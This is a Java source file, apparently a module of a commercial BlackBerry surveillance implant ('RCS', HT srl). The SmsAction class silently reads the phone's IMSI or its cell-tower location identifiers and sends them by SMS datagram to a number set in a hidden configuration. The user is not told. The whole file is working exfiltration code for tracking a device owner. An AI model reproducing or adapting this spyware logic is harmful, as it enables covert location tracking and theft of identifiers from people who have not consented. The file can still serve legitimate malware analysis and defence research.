//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SmsAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;
import java.io.IOException;
import java.io.InterruptedIOException;

import javax.microedition.io.Connector;
import javax.microedition.io.Datagram;
import javax.microedition.io.DatagramConnection;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import net.rim.device.api.system.CDMAInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
import net.rim.device.api.util.DataBuffer;
import blackberry.Device;
import blackberry.event.Event;
import blackberry.utils.Check;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class SmsAction.
 */
public final class SmsAction extends SubAction {

    private static final int TYPE_LOCATION = 1;
    private static final int TYPE_SIM = 2;
    private static final int TYPE_TEXT = 3;

    String number;
    String text;
    int type;

    /**
     * Instantiates a new sms action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public SmsAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {

        switch (type) {
        case TYPE_TEXT:
        case TYPE_SIM:
            return sendSMS(text);

        case TYPE_LOCATION:
            // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
            getGPSPosition();

            break;
        }
        return true;
    }

    private void getCellPosition() {

        //#ifdef DEBUG_TRACE
        debug.trace("getCellPosition");
        //#endif
        String message;

        final boolean gprs = !Device.isCDMA();
        if (gprs) {
            // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
            // CC e MNC possono essere estratti da IMEI
            // http://en.wikipedia.org/wiki/Mobile_country_code
            // http://en.wikipedia.org/wiki/Mobile_Network_Code
            final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();

            final int mcc = cellinfo.getMCC();
            final int mnc = cellinfo.getMNC();
            final int lac = cellinfo.getLAC();
            final int cid = cellinfo.getCellId();

            final int bsic = GPRSInfo.getCellInfo().getBSIC();

            final StringBuffer mb = new StringBuffer();
            mb.append("MCC: " + Integer.toHexString(mcc));
            mb.append(" MNC: " + mnc);
            mb.append(" LAC: " + lac);
            mb.append(" CID: " + cid);
            message = mb.toString();
        } else {
            final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();

            final int sid = cellinfo.getSID();
            final int nid = cellinfo.getNID();
            final int bid = cellinfo.getBID();

            final StringBuffer mb = new StringBuffer();
            mb.append("SID: " + sid);
            mb.append(" NID: " + nid);
            mb.append(" BID: " + bid);
            message = mb.toString();
        }
        //#ifdef DEBUG_INFO
        debug.info(message);
        //#endif

        sendSMS(message);
    }

    private void getGPSPosition() {
        getCellPosition();

    }

    boolean sendSMS(final String message) {
        
        return sendSMSDatagram(message);
        
      /*  boolean ret;
        if (Device.isCDMA()) {
            ret = sendSMSDatagram(message);
            if (!ret) {
                ret = sendSMSMessage(message);
            }
        } else {
            ret = sendSMSMessage(message);
        }

        return ret;*/
    }

    boolean sendSMSMessage(final String message) {

        //#ifdef DEBUG_INFO
        debug.info("Sending sms Message to: " + number + " message:" + message);
        //#endif
        try {
            final MessageConnection conn = (MessageConnection) Connector
                    .open("sms://");
            // generate a new text message
            final TextMessage tmsg = (TextMessage) conn
                    .newMessage(MessageConnection.TEXT_MESSAGE);
            // set the message text and the address
            tmsg.setAddress("sms://" + number);
            tmsg.setPayloadText(message);
            // finally send our message

            conn.send(tmsg);
        } catch (final InterruptedIOException e) {
            //#ifdef DEBUG
            debug.error("Cannot sending sms to: " + number + " ex:" + e);
            //#endif
            return false;
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("Cannot sending sms to: " + number + " ex:" + e);
            //#endif
            return false;
        }
        return true;
    }

    boolean sendSMSDatagram(final String message) {

        //#ifdef DEBUG_INFO
        debug
                .info("Sending sms Datagram to: " + number + " message:"
                        + message);
        //#endif
        try {
            final DatagramConnection conn = (DatagramConnection) Connector
                    .open("sms://"+ number);
            
            byte[] data = message.getBytes();
            Datagram dg = conn.newDatagram(conn.getMaximumLength());
            dg.setData(data, 0, data.length);
            conn.send(dg);
            
        } catch (final InterruptedIOException e) {
            //#ifdef DEBUG
            debug.error("Cannot sending sms to: " + number + " ex:" + e);
            //#endif
            return false;
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("Cannot sending sms to: " + number + " ex:" + e);
            //#endif
            return false;
        }
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            type = databuffer.readInt();

            //#ifdef DBC
            Check.asserts(type >= 1 && type <= 3, "wrong type");
            //#endif

            int len = databuffer.readInt();
            byte[] buffer = new byte[len];
            databuffer.read(buffer);
            number = WChar.getString(buffer, true);

            switch (type) {
            case TYPE_TEXT:
                len = databuffer.readInt();
                buffer = new byte[len];
                databuffer.read(buffer);
                text = WChar.getString(buffer, true);
                break;
            case TYPE_LOCATION:
                // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
                break;
            case TYPE_SIM:
                final String imsi = Device.getInstance().getImsi();
                text = "IMSI: " + imsi;
                break;
            default:
                //#ifdef DEBUG_ERROR
                debug.error("SmsAction.parse,  Unknown type: " + type);
                //#endif
                break;
            }

        } catch (final EOFException e) {

            return false;
        }

        return true;
    }

    public String toString() {
        final StringBuffer sb = new StringBuffer();
        sb.append("Sms type: " + type);
        sb.append(" number: " + number);
        sb.append(" text: " + text);

        return sb.toString();
    }
}
